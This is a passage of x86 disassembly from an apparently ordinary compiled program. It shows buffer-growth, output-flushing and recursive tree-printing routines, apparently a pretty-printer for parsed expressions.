  402cdc:	74 e7                	je     0x402cc5
  402cde:	83 38 2f             	cmpl   $0x2f,(%eax)
  402ce1:	75 e2                	jne    0x402cc5
  402ce3:	83 c4 04             	add    $0x4,%esp
  402ce6:	5b                   	pop    %ebx
  402ce7:	5e                   	pop    %esi
  402ce8:	c3                   	ret
  402ce9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402cf0:	57                   	push   %edi
  402cf1:	56                   	push   %esi
  402cf2:	53                   	push   %ebx
  402cf3:	83 ec 10             	sub    $0x10,%esp
  402cf6:	8b 74 24 28          	mov    0x28(%esp),%esi
  402cfa:	8b 7c 24 24          	mov    0x24(%esp),%edi
  402cfe:	8b 46 04             	mov    0x4(%esi),%eax
  402d01:	8b 5e 08             	mov    0x8(%esi),%ebx
  402d04:	8d 44 07 01          	lea    0x1(%edi,%eax,1),%eax
  402d08:	39 d8                	cmp    %ebx,%eax
  402d0a:	77 44                	ja     0x402d50
  402d0c:	8b 46 0c             	mov    0xc(%esi),%eax
  402d0f:	85 c0                	test   %eax,%eax
  402d11:	74 0d                	je     0x402d20
  402d13:	83 c4 10             	add    $0x10,%esp
  402d16:	5b                   	pop    %ebx
  402d17:	5e                   	pop    %esi
  402d18:	5f                   	pop    %edi
  402d19:	c3                   	ret
  402d1a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  402d20:	8b 46 04             	mov    0x4(%esi),%eax
  402d23:	03 06                	add    (%esi),%eax
  402d25:	8b 54 24 20          	mov    0x20(%esp),%edx
  402d29:	89 7c 24 08          	mov    %edi,0x8(%esp)
  402d2d:	89 54 24 04          	mov    %edx,0x4(%esp)
  402d31:	89 04 24             	mov    %eax,(%esp)
  402d34:	e8 5f f7 ff ff       	call   0x402498
  402d39:	8b 06                	mov    (%esi),%eax
  402d3b:	01 f8                	add    %edi,%eax
  402d3d:	03 46 04             	add    0x4(%esi),%eax
  402d40:	c6 00 00             	movb   $0x0,(%eax)
  402d43:	01 7e 04             	add    %edi,0x4(%esi)
  402d46:	83 c4 10             	add    $0x10,%esp
  402d49:	5b                   	pop    %ebx
  402d4a:	5e                   	pop    %esi
  402d4b:	5f                   	pop    %edi
  402d4c:	c3                   	ret
  402d4d:	8d 76 00             	lea    0x0(%esi),%esi
  402d50:	8b 56 0c             	mov    0xc(%esi),%edx
  402d53:	85 d2                	test   %edx,%edx
  402d55:	75 bc                	jne    0x402d13
  402d57:	85 db                	test   %ebx,%ebx
  402d59:	75 07                	jne    0x402d62
  402d5b:	83 f8 02             	cmp    $0x2,%eax
  402d5e:	76 21                	jbe    0x402d81
  402d60:	b3 02                	mov    $0x2,%bl
  402d62:	01 db                	add    %ebx,%ebx
  402d64:	39 d8                	cmp    %ebx,%eax
  402d66:	77 fa                	ja     0x402d62
  402d68:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  402d6c:	8b 06                	mov    (%esi),%eax
  402d6e:	89 04 24             	mov    %eax,(%esp)
  402d71:	e8 5a d1 00 00       	call   0x40fed0
  402d76:	85 c0                	test   %eax,%eax
  402d78:	74 0e                	je     0x402d88
  402d7a:	89 06                	mov    %eax,(%esi)
  402d7c:	89 5e 08             	mov    %ebx,0x8(%esi)
  402d7f:	eb 8b                	jmp    0x402d0c
  402d81:	bb 02 00 00 00       	mov    $0x2,%ebx
  402d86:	eb e0                	jmp    0x402d68
  402d88:	8b 06                	mov    (%esi),%eax
  402d8a:	89 04 24             	mov    %eax,(%esp)
  402d8d:	e8 06 d1 00 00       	call   0x40fe98
  402d92:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  402d98:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  402d9f:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  402da6:	c7 46 0c 01 00 00 00 	movl   $0x1,0xc(%esi)
  402dad:	e9 61 ff ff ff       	jmp    0x402d13
  402db2:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402db9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  402dc0:	55                   	push   %ebp
  402dc1:	57                   	push   %edi
  402dc2:	56                   	push   %esi
  402dc3:	53                   	push   %ebx
  402dc4:	89 c6                	mov    %eax,%esi
  402dc6:	89 d3                	mov    %edx,%ebx
  402dc8:	83 ec 2c             	sub    $0x2c,%esp
  402dcb:	89 14 24             	mov    %edx,(%esp)
  402dce:	e8 bd f6 ff ff       	call   0x402490
  402dd3:	85 c0                	test   %eax,%eax
  402dd5:	74 6c                	je     0x402e43
  402dd7:	8b 8e 00 01 00 00    	mov    0x100(%esi),%ecx
  402ddd:	8d 2c 03             	lea    (%ebx,%eax,1),%ebp
  402de0:	eb 1b                	jmp    0x402dfd
  402de2:	89 cf                	mov    %ecx,%edi
  402de4:	83 c1 01             	add    $0x1,%ecx
  402de7:	83 c3 01             	add    $0x1,%ebx
  402dea:	89 8e 00 01 00 00    	mov    %ecx,0x100(%esi)
  402df0:	88 14 3e             	mov    %dl,(%esi,%edi,1)
  402df3:	39 eb                	cmp    %ebp,%ebx
  402df5:	88 96 04 01 00 00    	mov    %dl,0x104(%esi)
  402dfb:	74 46                	je     0x402e43
  402dfd:	81 f9 ff 00 00 00    	cmp    $0xff,%ecx
  402e03:	0f b6 13             	movzbl (%ebx),%edx
  402e06:	75 da                	jne    0x402de2
  402e08:	8b 86 0c 01 00 00    	mov    0x10c(%esi),%eax
  402e0e:	88 54 24 1f          	mov    %dl,0x1f(%esp)
  402e12:	31 ff                	xor    %edi,%edi
  402e14:	c6 86 ff 00 00 00 00 	movb   $0x0,0xff(%esi)
  402e1b:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  402e22:	00 
  402e23:	89 34 24             	mov    %esi,(%esp)
  402e26:	89 44 24 08          	mov    %eax,0x8(%esp)
  402e2a:	ff 96 08 01 00 00    	call   *0x108(%esi)
  402e30:	83 86 20 01 00 00 01 	addl   $0x1,0x120(%esi)
  402e37:	b9 01 00 00 00       	mov    $0x1,%ecx
  402e3c:	0f b6 54 24 1f       	movzbl 0x1f(%esp),%edx
  402e41:	eb a4                	jmp    0x402de7
  402e43:	83 c4 2c             	add    $0x2c,%esp
  402e46:	5b                   	pop    %ebx
  402e47:	5e                   	pop    %esi
  402e48:	5f                   	pop    %edi
  402e49:	5d                   	pop    %ebp
  402e4a:	c3                   	ret
  402e4b:	90                   	nop
  402e4c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  402e50:	55                   	push   %ebp
  402e51:	57                   	push   %edi
  402e52:	56                   	push   %esi
  402e53:	53                   	push   %ebx
  402e54:	89 c3                	mov    %eax,%ebx
  402e56:	83 ec 4c             	sub    $0x4c,%esp
  402e59:	8d 6c 24 27          	lea    0x27(%esp),%ebp
  402e5d:	89 54 24 08          	mov    %edx,0x8(%esp)
  402e61:	c7 44 24 04 2c 7a 42 	movl   $0x427a2c,0x4(%esp)
  402e68:	00 
  402e69:	89 2c 24             	mov    %ebp,(%esp)
  402e6c:	e8 67 d0 00 00       	call   0x40fed8
  402e71:	89 2c 24             	mov    %ebp,(%esp)
  402e74:	e8 17 f6 ff ff       	call   0x402490
  402e79:	85 c0                	test   %eax,%eax
  402e7b:	0f 84 7f 00 00 00    	je     0x402f00
  402e81:	8b 93 00 01 00 00    	mov    0x100(%ebx),%edx
  402e87:	31 f6                	xor    %esi,%esi
  402e89:	eb 20                	jmp    0x402eab
  402e8b:	90                   	nop
  402e8c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  402e90:	89 d7                	mov    %edx,%edi
  402e92:	83 c2 01             	add    $0x1,%edx
  402e95:	83 c6 01             	add    $0x1,%esi
  402e98:	89 93 00 01 00 00    	mov    %edx,0x100(%ebx)
  402e9e:	88 0c 3b             	mov    %cl,(%ebx,%edi,1)
  402ea1:	39 c6                	cmp    %eax,%esi
  402ea3:	88 8b 04 01 00 00    	mov    %cl,0x104(%ebx)
  402ea9:	74 55                	je     0x402f00
  402eab:	81 fa ff 00 00 00    	cmp    $0xff,%edx
  402eb1:	0f b6 4c 35 00       	movzbl 0x0(%ebp,%esi,1),%ecx
  402eb6:	75 d8                	jne    0x402e90
  402eb8:	8b 93 0c 01 00 00    	mov    0x10c(%ebx),%edx
  402ebe:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  402ec2:	31 ff                	xor    %edi,%edi
  402ec4:	88 4c 24 1b          	mov    %cl,0x1b(%esp)
  402ec8:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  402ecf:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  402ed6:	00 
  402ed7:	89 1c 24             	mov    %ebx,(%esp)
  402eda:	89 54 24 08          	mov    %edx,0x8(%esp)
  402ede:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  402ee4:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  402eeb:	ba 01 00 00 00       	mov    $0x1,%edx
  402ef0:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  402ef4:	0f b6 4c 24 1b       	movzbl 0x1b(%esp),%ecx
  402ef9:	eb 9a                	jmp    0x402e95
  402efb:	90                   	nop
  402efc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  402f00:	83 c4 4c             	add    $0x4c,%esp
  402f03:	5b                   	pop    %ebx
  402f04:	5e                   	pop    %esi
  402f05:	5f                   	pop    %edi
  402f06:	5d                   	pop    %ebp
  402f07:	c3                   	ret
  402f08:	90                   	nop
  402f09:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402f10:	55                   	push   %ebp
  402f11:	57                   	push   %edi
  402f12:	89 cd                	mov    %ecx,%ebp
  402f14:	56                   	push   %esi
  402f15:	53                   	push   %ebx
  402f16:	89 c3                	mov    %eax,%ebx
  402f18:	81 ec 8c 00 00 00    	sub    $0x8c,%esp
  402f1e:	85 c9                	test   %ecx,%ecx
  402f20:	89 54 24 18          	mov    %edx,0x18(%esp)
  402f24:	0f 84 56 01 00 00    	je     0x403080
  402f2a:	8b 80 18 01 00 00    	mov    0x118(%eax),%eax
  402f30:	85 c0                	test   %eax,%eax
  402f32:	0f 85 c8 00 00 00    	jne    0x403000
  402f38:	8b 01                	mov    (%ecx),%eax
  402f3a:	83 f8 4b             	cmp    $0x4b,%eax
  402f3d:	0f 87 09 15 00 00    	ja     0x40444c
  402f43:	ff 24 85 98 7c 42 00 	jmp    *0x427c98(,%eax,4)
  402f4a:	8b 51 04             	mov    0x4(%ecx),%edx
  402f4d:	31 f6                	xor    %esi,%esi
  402f4f:	83 3a 27             	cmpl   $0x27,(%edx)
  402f52:	75 31                	jne    0x402f85
  402f54:	8b 52 04             	mov    0x4(%edx),%edx
  402f57:	8b 72 10             	mov    0x10(%edx),%esi
  402f5a:	83 fe 01             	cmp    $0x1,%esi
  402f5d:	72 26                	jb     0x402f85
  402f5f:	83 fe 06             	cmp    $0x6,%esi
  402f62:	0f 86 22 20 00 00    	jbe    0x404f8a
  402f68:	83 fe 07             	cmp    $0x7,%esi
  402f6b:	75 18                	jne    0x402f85
  402f6d:	8b 51 08             	mov    0x8(%ecx),%edx
  402f70:	8b 3a                	mov    (%edx),%edi
  402f72:	85 ff                	test   %edi,%edi
  402f74:	75 0f                	jne    0x402f85
  402f76:	83 7a 08 01          	cmpl   $0x1,0x8(%edx)
  402f7a:	75 09                	jne    0x402f85
  402f7c:	83 f8 3b             	cmp    $0x3b,%eax
  402f7f:	0f 84 9f 26 00 00    	je     0x405624
  402f85:	8b 83 00 01 00 00    	mov    0x100(%ebx),%eax
  402f8b:	3d ff 00 00 00       	cmp    $0xff,%eax
  402f90:	0f 84 4b 1f 00 00    	je     0x404ee1
  402f96:	8d 50 01             	lea    0x1(%eax),%edx
  402f99:	89 93 00 01 00 00    	mov    %edx,0x100(%ebx)
  402f9f:	c6 04 03 28          	movb   $0x28,(%ebx,%eax,1)
  402fa3:	89 d8                	mov    %ebx,%eax
  402fa5:	c6 83 04 01 00 00 28 	movb   $0x28,0x104(%ebx)
  402fac:	8b 54 24 18          	mov    0x18(%esp),%edx
  402fb0:	8b 4d 04             	mov    0x4(%ebp),%ecx
  402fb3:	e8 58 ff ff ff       	call   0x402f10
  402fb8:	8b 83 00 01 00 00    	mov    0x100(%ebx),%eax
  402fbe:	3d ff 00 00 00       	cmp    $0xff,%eax
  402fc3:	0f 84 e3 1e 00 00    	je     0x404eac
  402fc9:	8d 50 01             	lea    0x1(%eax),%edx
  402fcc:	89 93 00 01 00 00    	mov    %edx,0x100(%ebx)
  402fd2:	c6 04 03 29          	movb   $0x29,(%ebx,%eax,1)
  402fd6:	c6 83 04 01 00 00 29 	movb   $0x29,0x104(%ebx)
  402fdd:	83 7d 00 3c          	cmpl   $0x3c,0x0(%ebp)
  402fe1:	0f 84 06 21 00 00    	je     0x4050ed
  402fe7:	83 fe 08             	cmp    $0x8,%esi
  402fea:	0f 84 d2 20 00 00    	je     0x4050c2
  402ff0:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402ff3:	8b 54 24 18          	mov    0x18(%esp),%edx
  402ff7:	89 d8                	mov    %ebx,%eax
  402ff9:	e8 12 ff ff ff       	call   0x402f10
  402ffe:	66 90                	xchg   %ax,%ax
  403000:	81 c4 8c 00 00 00    	add    $0x8c,%esp
  403006:	5b                   	pop    %ebx
  403007:	5e                   	pop    %esi
  403008:	5f                   	pop    %edi
  403009:	5d                   	pop    %ebp
  40300a:	c3                   	ret
  40300b:	8b 7c 24 20          	mov    0x20(%esp),%edi
  40300f:	8b 57 04             	mov    0x4(%edi),%edx
  403012:	8b b3 10 01 00 00    	mov    0x110(%ebx),%esi
  403018:	89 93 10 01 00 00    	mov    %edx,0x110(%ebx)
  40301e:	8d 50 04             	lea    0x4(%eax),%edx
  403021:	89 d8                	mov    %ebx,%eax
  403023:	89 74 24 1c          	mov    %esi,0x1c(%esp)
  403027:	be 01 00 00 00       	mov    $0x1,%esi
  40302c:	e8 ff fb ff ff       	call   0x402c30
  403031:	85 c0                	test   %eax,%eax
  403033:	74 40                	je     0x403075
  403035:	83 38 2f             	cmpl   $0x2f,(%eax)
  403038:	0f 85 34 13 00 00    	jne    0x404372
  40303e:	8b 93 1c 01 00 00    	mov    0x11c(%ebx),%edx
  403044:	eb 19                	jmp    0x40305f
  403046:	8d 76 00             	lea    0x0(%esi),%esi
  403049:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  403050:	8b 40 08             	mov    0x8(%eax),%eax
  403053:	83 ea 01             	sub    $0x1,%edx
  403056:	85 c0                	test   %eax,%eax
  403058:	74 17                	je     0x403071
  40305a:	83 38 2f             	cmpl   $0x2f,(%eax)
  40305d:	75 12                	jne    0x403071
  40305f:	83 fa 00             	cmp    $0x0,%edx
  403062:	7f ec                	jg     0x403050
  403064:	75 0b                	jne    0x403071
  403066:	8b 40 04             	mov    0x4(%eax),%eax
  403069:	85 c0                	test   %eax,%eax
  40306b:	0f 85 01 13 00 00    	jne    0x404372
  403071:	85 f6                	test   %esi,%esi
  403073:	74 0b                	je     0x403080
  403075:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  403079:	89 83 10 01 00 00    	mov    %eax,0x110(%ebx)
  40307f:	90                   	nop
  403080:	c7 83 18 01 00 00 01 	movl   $0x1,0x118(%ebx)
  403087:	00 00 00 
  40308a:	81 c4 8c 00 00 00    	add    $0x8c,%esp
  403090:	5b                   	pop    %ebx
  403091:	5e                   	pop    %esi
  403092:	5f                   	pop    %edi
  403093:	5d                   	pop    %ebp
  403094:	c3                   	ret
  403095:	8b 7c 24 18          	mov    0x18(%esp),%edi
  403099:	8b 49 04             	mov    0x4(%ecx),%ecx
  40309c:	89 d8                	mov    %ebx,%eax
  40309e:	89 fa                	mov    %edi,%edx
  4030a0:	e8 6b fe ff ff       	call   0x402f10
  4030a5:	89 d8                	mov    %ebx,%eax
  4030a7:	ba 8c 7c 42 00       	mov    $0x427c8c,%edx
  4030ac:	e8 0f fd ff ff       	call   0x402dc0
  4030b1:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4030b4:	89 fa                	mov    %edi,%edx
  4030b6:	89 d8                	mov    %ebx,%eax
  4030b8:	e8 53 fe ff ff       	call   0x402f10
  4030bd:	ba 5d 00 00 00       	mov    $0x5d,%edx
  4030c2:	89 d8                	mov    %ebx,%eax
  4030c4:	e8 37 f8 ff ff       	call   0x402900
  4030c9:	e9 32 ff ff ff       	jmp    0x403000
  4030ce:	8b 49 04             	mov    0x4(%ecx),%ecx
  4030d1:	8b 54 24 18          	mov    0x18(%esp),%edx
  4030d5:	89 d8                	mov    %ebx,%eax
  4030d7:	be 30 7a 42 00       	mov    $0x427a30,%esi
  4030dc:	e8 2f fe ff ff       	call   0x402f10
  4030e1:	8b 83 00 01 00 00    	mov    0x100(%ebx),%eax
  4030e7:	eb 2a                	jmp    0x403113
  4030e9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4030f0:	89 c1                	mov    %eax,%ecx
  4030f2:	83 c0 01             	add    $0x1,%eax
  4030f5:	83 c6 01             	add    $0x1,%esi
  4030f8:	89 83 00 01 00 00    	mov    %eax,0x100(%ebx)
  4030fe:	88 14 0b             	mov    %dl,(%ebx,%ecx,1)
  403101:	81 fe 35 7a 42 00    	cmp    $0x427a35,%esi
  403107:	88 93 04 01 00 00    	mov    %dl,0x104(%ebx)
  40310d:	0f 84 15 14 00 00    	je     0x404528
  403113:	3d ff 00 00 00       	cmp    $0xff,%eax
  403118:	0f b6 16             	movzbl (%esi),%edx
  40311b:	75 d3                	jne    0x4030f0
  40311d:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  403123:	88 54 24 1c          	mov    %dl,0x1c(%esp)
  403127:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  40312e:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  403135:	00 
  403136:	89 1c 24             	mov    %ebx,(%esp)
  403139:	89 44 24 08          	mov    %eax,0x8(%esp)
  40313d:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  403143:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  40314a:	b8 01 00 00 00       	mov    $0x1,%eax
  40314f:	31 c9                	xor    %ecx,%ecx
  403151:	0f b6 54 24 1c       	movzbl 0x1c(%esp),%edx
  403156:	eb 9d                	jmp    0x4030f5
  403158:	8b 51 04             	mov    0x4(%ecx),%edx
  40315b:	89 d8                	mov    %ebx,%eax
  40315d:	e8 2e fb ff ff       	call   0x402c90
  403162:	85 c0                	test   %eax,%eax
  403164:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%esp)
  40316b:	00 
  40316c:	8b 54 24 20          	mov    0x20(%esp),%edx
  403170:	0f 84 b7 23 00 00    	je     0x40552d
  403176:	8d 76 00             	lea    0x0(%esi),%esi
  403179:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  403180:	83 38 2f             	cmpl   $0x2f,(%eax)
  403183:	0f 85 65 15 00 00    	jne    0x4046ee
  403189:	8b 48 04             	mov    0x4(%eax),%ecx
  40318c:	85 c9                	test   %ecx,%ecx
  40318e:	0f 84 5a 15 00 00    	je     0x4046ee
  403194:	8b 40 08             	mov    0x8(%eax),%eax
  403197:	83 c2 01             	add    $0x1,%edx
  40319a:	85 c0                	test   %eax,%eax
  40319c:	75 e2                	jne    0x403180
  40319e:	8b 45 04             	mov    0x4(%ebp),%eax
  4031a1:	89 54 24 20          	mov    %edx,0x20(%esp)
  4031a5:	89 44 24 24          	mov    %eax,0x24(%esp)
  4031a9:	8b 44 24 20          	mov    0x20(%esp),%eax
  4031ad:	31 f6                	xor    %esi,%esi
  4031af:	8d 68 ff             	lea    -0x1(%eax),%ebp
  4031b2:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  4031b6:	8b 54 24 18          	mov    0x18(%esp),%edx
  4031ba:	89 d8                	mov    %ebx,%eax
  4031bc:	89 b3 1c 01 00 00    	mov    %esi,0x11c(%ebx)
  4031c2:	e8 49 fd ff ff       	call   0x402f10
  4031c7:	39 f5                	cmp    %esi,%ebp
  4031c9:	0f 8e c1 12 00 00    	jle    0x404490
  4031cf:	8b 93 00 01 00 00    	mov    0x100(%ebx),%edx
  4031d5:	bf c6 7b 42 00       	mov    $0x427bc6,%edi
  4031da:	eb 27                	jmp    0x403203
  4031dc:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4031e0:	89 d1                	mov    %edx,%ecx
  4031e2:	83 c2 01             	add    $0x1,%edx
  4031e5:	83 c7 01             	add    $0x1,%edi
  4031e8:	89 93 00 01 00 00    	mov    %edx,0x100(%ebx)
  4031ee:	88 04 0b             	mov    %al,(%ebx,%ecx,1)
  4031f1:	81 ff c8 7b 42 00    	cmp    $0x427bc8,%edi
  4031f7:	88 83 04 01 00 00    	mov    %al,0x104(%ebx)
  4031fd:	0f 84 8d 12 00 00    	je     0x404490
  403203:	81 fa ff 00 00 00    	cmp    $0xff,%edx
  403209:	0f b6 07             	movzbl (%edi),%eax
  40320c:	75 d2                	jne    0x4031e0
  40320e:	8b 93 0c 01 00 00    	mov    0x10c(%ebx),%edx
  403214:	88 44 24 1c          	mov    %al,0x1c(%esp)
  403218:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  40321f:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  403226:	00 
  403227:	89 1c 24             	mov    %ebx,(%esp)
  40322a:	89 54 24 08          	mov    %edx,0x8(%esp)
  40322e:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  403234:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  40323b:	ba 01 00 00 00       	mov    $0x1,%edx
  403240:	31 c9                	xor    %ecx,%ecx
  403242:	0f b6 44 24 1c       	movzbl 0x1c(%esp),%eax
  403247:	eb 9c                	jmp    0x4031e5
  403249:	8b 83 00 01 00 00    	mov    0x100(%ebx),%eax
  40324f:	be 97 7b 42 00       	mov    $0x427b97,%esi
  403254:	eb 2d                	jmp    0x403283
  403256:	8d 76 00             	lea    0x0(%esi),%esi
  403259:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  403260:	89 c1                	mov    %eax,%ecx
  403262:	83 c0 01             	add    $0x1,%eax
  403265:	83 c6 01             	add    $0x1,%esi
  403268:	89 83 00 01 00 00    	mov    %eax,0x100(%ebx)
  40326e:	88 14 0b             	mov    %dl,(%ebx,%ecx,1)
  403271:	81 fe b1 7b 42 00    	cmp    $0x427bb1,%esi
  403277:	88 93 04 01 00 00    	mov    %dl,0x104(%ebx)
  40327d:	0f 84 f0 12 00 00    	je     0x404573
  403283:	3d ff 00 00 00       	cmp    $0xff,%eax
  403288:	0f b6 16             	movzbl (%esi),%edx
  40328b:	75 d3                	jne    0x403260
  40328d:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  403293:	88 54 24 1c          	mov    %dl,0x1c(%esp)
  403297:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  40329e:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  4032a5:	00 
  4032a6:	89 1c 24             	mov    %ebx,(%esp)
  4032a9:	89 44 24 08          	mov    %eax,0x8(%esp)
  4032ad:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  4032b3:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  4032ba:	b8 01 00 00 00       	mov    $0x1,%eax
  4032bf:	31 c9                	xor    %ecx,%ecx
  4032c1:	0f b6 54 24 1c       	movzbl 0x1c(%esp),%edx
  4032c6:	eb 9d                	jmp    0x403265
  4032c8:	89 d8                	mov    %ebx,%eax
  4032ca:	ba 7d 7c 42 00       	mov    $0x427c7d,%edx
  4032cf:	e8 ec fa ff ff       	call   0x402dc0
  4032d4:	8b 55 04             	mov    0x4(%ebp),%edx
  4032d7:	89 d8                	mov    %ebx,%eax
  4032d9:	83 c2 01             	add    $0x1,%edx
  4032dc:	e8 6f fb ff ff       	call   0x402e50
  4032e1:	ba 7d 00 00 00       	mov    $0x7d,%edx
  4032e6:	89 d8                	mov    %ebx,%eax
  4032e8:	e8 13 f6 ff ff       	call   0x402900
  4032ed:	e9 0e fd ff ff       	jmp    0x403000
  4032f2:	8b 83 00 01 00 00    	mov    0x100(%ebx),%eax
  4032f8:	be 71 7c 42 00       	mov    $0x427c71,%esi
  4032fd:	eb 24                	jmp    0x403323
  4032ff:	90                   	nop
  403300:	89 c1                	mov    %eax,%ecx
  403302:	83 c0 01             	add    $0x1,%eax
  403305:	83 c6 01             	add    $0x1,%esi
  403308:	89 83 00 01 00 00    	mov    %eax,0x100(%ebx)
  40330e:	88 14 0b             	mov    %dl,(%ebx,%ecx,1)
  403311:	81 fe 79 7c 42 00    	cmp    $0x427c79,%esi
  403317:	88 93 04 01 00 00    	mov    %dl,0x104(%ebx)
  40331d:	0f 84 63 12 00 00    	je     0x404586
  403323:	3d ff 00 00 00       	cmp    $0xff,%eax
  403328:	0f b6 16             	movzbl (%esi),%edx
  40332b:	75 d3                	jne    0x403300
  40332d:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  403333:	88 54 24 1c          	mov    %dl,0x1c(%esp)
  403337:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  40333e:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  403345:	00 
  403346:	89 1c 24             	mov    %ebx,(%esp)
  403349:	89 44 24 08          	mov    %eax,0x8(%esp)
  40334d:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  403353:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  40335a:	b8 01 00 00 00       	mov    $0x1,%eax
  40335f:	31 c9                	xor    %ecx,%ecx
  403361:	0f b6 54 24 1c       	movzbl 0x1c(%esp),%edx
  403366:	eb 9d                	jmp    0x403305
  403368:	8b 83 00 01 00 00    	mov    0x100(%ebx),%eax
  40336e:	be 54 7c 42 00       	mov    $0x427c54,%esi
  403373:	eb 23                	jmp    0x403398
  403375:	89 c1                	mov    %eax,%ecx
  403377:	83 c0 01             	add    $0x1,%eax
  40337a:	83 c6 01             	add    $0x1,%esi
  40337d:	89 83 00 01 00 00    	mov    %eax,0x100(%ebx)
  403383:	88 14 0b             	mov    %dl,(%ebx,%ecx,1)
  403386:	81 fe 70 7c 42 00    	cmp    $0x427c70,%esi
  40338c:	88 93 04 01 00 00    	mov    %dl,0x104(%ebx)
  403392:	0f 84 d1 12 00 00    	je     0x404669
  403398:	3d ff 00 00 00       	cmp    $0xff,%eax
  40339d:	0f b6 16             	movzbl (%esi),%edx
  4033a0:	75 d3                	jne    0x403375
  4033a2:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  4033a8:	88 54 24 1c          	mov    %dl,0x1c(%esp)
  4033ac:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  4033b3:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  4033ba:	00 
  4033bb:	89 1c 24             	mov    %ebx,(%esp)
  4033be:	89 44 24 08          	mov    %eax,0x8(%esp)
  4033c2:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  4033c8:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  4033cf:	b8 01 00 00 00       	mov    $0x1,%eax
  4033d4:	31 c9                	xor    %ecx,%ecx
  4033d6:	0f b6 54 24 1c       	movzbl 0x1c(%esp),%edx
  4033db:	eb 9d                	jmp    0x40337a
  4033dd:	8b 83 00 01 00 00    	mov    0x100(%ebx),%eax
  4033e3:	be 1b 7c 42 00       	mov    $0x427c1b,%esi
  4033e8:	eb 29                	jmp    0x403413
  4033ea:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4033f0:	89 c1                	mov    %eax,%ecx
  4033f2:	83 c0 01             	add    $0x1,%eax
  4033f5:	83 c6 01             	add    $0x1,%esi
  4033f8:	89 83 00 01 00 00    	mov    %eax,0x100(%ebx)
  4033fe:	88 14 0b             	mov    %dl,(%ebx,%ecx,1)
  403401:	81 fe 25 7c 42 00    	cmp    $0x427c25,%esi
  403407:	88 93 04 01 00 00    	mov    %dl,0x104(%ebx)
  40340d:	0f 84 dd 10 00 00    	je     0x4044f0
  403413:	3d ff 00 00 00       	cmp    $0xff,%eax
  403418:	0f b6 16             	movzbl (%esi),%edx
  40341b:	75 d3                	jne    0x4033f0
  40341d:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  403423:	88 54 24 1c          	mov    %dl,0x1c(%esp)
  403427:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  40342e:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  403435:	00 
  403436:	89 1c 24             	mov    %ebx,(%esp)
  403439:	89 44 24 08          	mov    %eax,0x8(%esp)
  40343d:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  403443:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  40344a:	b8 01 00 00 00       	mov    $0x1,%eax
  40344f:	31 c9                	xor    %ecx,%ecx
  403451:	0f b6 54 24 1c       	movzbl 0x1c(%esp),%edx
  403456:	eb 9d                	jmp    0x4033f5
  403458:	8b 83 00 01 00 00    	mov    0x100(%ebx),%eax
  40345e:	be 36 7c 42 00       	mov    $0x427c36,%esi
  403463:	eb 23                	jmp    0x403488
  403465:	89 c1                	mov    %eax,%ecx
  403467:	83 c0 01             	add    $0x1,%eax
  40346a:	83 c6 01             	add    $0x1,%esi
  40346d:	89 83 00 01 00 00    	mov    %eax,0x100(%ebx)
